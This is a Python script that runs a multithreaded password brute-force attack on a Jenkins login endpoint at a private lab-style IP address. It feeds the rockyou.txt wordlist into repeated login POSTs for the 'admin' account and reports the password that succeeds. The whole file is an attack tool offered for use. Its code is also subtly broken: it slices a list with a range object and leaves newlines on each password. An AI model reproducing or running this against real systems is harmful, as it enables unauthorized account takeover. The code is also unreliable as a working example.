import requests
import threading


URL = "http://10.129.242.124:8080/j_spring_security_check"
cookies = {"JSESSIONID.6976eb0d" : "node01df91p70w0qw9cw99h4bwk0q20.node0"}
data = {
	"j_username"  : "admin",
	"j_password"  : "admin",
	"Submit"      : "Sign+in",
	"remember_me" : "on",
	"from"		  : "%2F"
}

headers = {
	"host" : "10.129.242.124:8080",
	"user-agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate, br",
	"Content-Type": "application/x-www-form-urlencoded",
	"Content-Length": "54",
	"Origin": "http://10.129.242.124:8080",
	"Connection": "close"
}

PASSWORD_FILE = "/usr/share/wordlists/rockyou.txt"
PASSWORD_LINES = open(PASSWORD_FILE, mode='r', errors="ignore").readlines()
NUMBER_OF_LINES = len(PASSWORD_LINES)

FOUND = False
USER  = "root"

N_THREADS = 10
SPLIT_INDEXES = []

for i in range(N_THREADS):
	start_idx = i * NUMBER_OF_LINES // N_THREADS
	end_idx   = (i + 1) * NUMBER_OF_LINES // N_THREADS
	if end_idx > NUMBER_OF_LINES:
		end_idx = NUMBER_OF_LINES - start_idx
	
	SPLIT_INDEXES.append(range(start_idx, end_idx))

def bruteforce(index):
	data = {
		"j_username"  : "admin",
		"j_password"  : "admin",
		"Submit"      : "Sign+in",
		"remember_me" : "on",
		"from"		  : "%2F"
	}
	global FOUND
	with open(PASSWORD_FILE, mode='r', errors="ignore") as iostream:
		corr_range = SPLIT_INDEXES[index]
		for password_ in iostream.readlines()[corr_range]:
			if FOUND is True:
				return
				
			data['j_password'] = password_
			resp = requests.post(
				URL, data=data, cookies=cookies, 
				headers=headers, allow_redirects=False)
			
			if 'loginError' in resp.headers['Location']:
				continue
				
			print(f"Password Found: {password_}")
			FOUND = True
			return


print("Starting the attack")
threads = []
for thread_idx in range(N_THREADS):
	x = threading.Thread(target=bruteforce, args=(thread_idx,))
	threads.append(x)
	x.start()
	
for thread in threads:
	thread.join()
